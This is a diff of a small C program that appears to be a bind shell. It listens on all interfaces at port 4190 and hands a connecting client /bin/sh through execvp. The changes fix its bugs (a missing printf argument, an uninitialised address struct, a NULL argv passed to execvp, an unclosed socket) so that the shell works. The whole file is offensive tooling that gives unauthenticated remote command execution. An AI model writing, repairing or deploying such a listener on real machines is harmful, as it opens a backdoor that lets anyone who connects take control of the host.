@@ -6,12 +6,12 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/socket.h>
+#include <string.h>
 #include <netinet/in.h>
 #include <unistd.h>
 
 #define ADDRESS "0.0.0.0"
 #define PORT 4190
-#define MAX_CLIENTS 5
 
 int main()
 {
@@ -22,10 +22,11 @@ int main()
     perror("[x] Failed To Create Socket! [x]");
     exit(1);
   }
-  printf("Socket FD: %d\n");
+  printf("Socket FD: %d\n", shellSock);
 
   // Define the Address structure.
   struct sockaddr_in server_addr;
+  memset(&server_addr, 0, sizeof(server_addr));
   socklen_t addrlen = sizeof(server_addr);
 
   server_addr.sin_family = AF_INET;
@@ -42,7 +43,7 @@ int main()
   printf("[+] Socket Bound To Address! [+]\n");
 
   // Listen for incoming client connection.
-  if (listen(shellSock, MAX_CLIENTS) < 0)
+  if (listen(shellSock, 1) < 0)
   {
     perror("[x] Failed To Listen On Socket! [x]");
     exit(1);
@@ -64,8 +65,9 @@ int main()
   }
 
   // Execute /bin/sh so the client can have a shell.
-  execvp("/bin/sh", NULL);
+  char * const argv[] = {"/bin/sh", NULL};
+  execvp("/bin/sh", argv);
     
-  //close(shellSock);
+  close(shellSock);
   return EXIT_SUCCESS;
 }
